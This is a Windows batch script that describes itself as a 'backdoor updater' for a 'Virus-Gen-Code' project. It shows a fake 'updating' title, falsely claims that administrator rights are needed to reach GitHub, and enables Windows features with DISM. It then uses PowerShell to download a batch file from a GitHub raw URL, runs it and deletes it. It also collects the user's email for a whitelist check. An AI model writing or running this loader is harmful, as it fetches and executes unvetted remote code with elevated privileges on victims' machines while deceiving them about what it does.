@echo off&Title updating...&cd C:\users\%username%\AppData&cls
::this is a free version of the backdoor updater
echo [33mvalidating configuration[0m
goto CP
:adminyes
Dism /online /Get-FeatureInfo /FeatureName:Internet-Explorer-Optional-amd64>data1.txt
>nul find "State : Enabled" data1.txt && (
  goto int_exp_found
) || (
  goto int_exp_not_found
)
:int_exp_found
echo [92mvalidation complete[0m
echo [33mupdating[0m
:: download source
Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/free_source.bat").Content >GVG.bat
>nul find "The remote name could not be resolved" GVG.bat && (
  goto offline
) || (
  goto online
)
:online
echo [92mupdate complete[0m
call GVG.bat
timeout 1 /NOBREAK >nul
del GVG.bat
exit
:offline
echo.
echo [31mthis program requires an internet connection[0m
echo.
echo press any key to exit...
pause >nul
exit
:WLcheck
< C:\ProgramData\GVGemail.sav (
  set /p email=
)
>nul find "%email%" WL1.sav && (
  goto EMnxt
) || (
  goto Whitelist_error
)
:Whitelist_error
if exist WL1.sav (del WL1.sav)
if exist WL2.sav (del WL2.sav)
echo.
echo [31merror, you are not whitelisted[0m
echo.
echo press any key to exit...
pause >nul
exit
:email_error
echo [31merror code: 02[0m
echo [31merror: email save was not detected[0m
echo [31merror type: resolvable[0m
echo [31mhow to replicate: delete C:\ProgramData\GVGemail.sav[0m
echo [31mhow to fix: Program will now ask for your email, email will be saved so this error will not show up again[0m
echo [31mextra information: email is required by github to verify your identity, email WILL BE PUBLIC on github.[0m
echo.
echo press any key to fill out email...
pause >nul
set /p email=email:
echo %email%>C:\ProgramData\GVGemail.sav
if exist C:\ProgramData\GVGemail.sav (echo [92memail was successfully saved![0m) else (exit)
:admin_error
echo [31merror code: 03[0m
echo [31merror: program was not run with administrator perms[0m
echo [31merror type: fatal[0m
echo [31mhow to replicate: do not run file as administrator[0m
echo [31mhow to fix: rerun program by right clicking on file and clicking "run as administrator"[0m
echo [31mextra information: administrator perms are required to access github[0m
echo.
echo press any key to exit...
pause >nul
exit
:int_exp_not_found
dism /online /enable-feature /featurename:SearchEngine-Client-Package /all
Dism /online /Enable-Feature /FeatureName:Internet-Explorer-Optional-amd64 /All
echo you cannot use this program till you restart
echo exiting in 10 secconds...
timeout 10
exit
:CP
    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto adminyes
    ) else (
        goto admin_error
    )
:loader create_loader
echo [33mloading bar script not detected, creating it now...[0m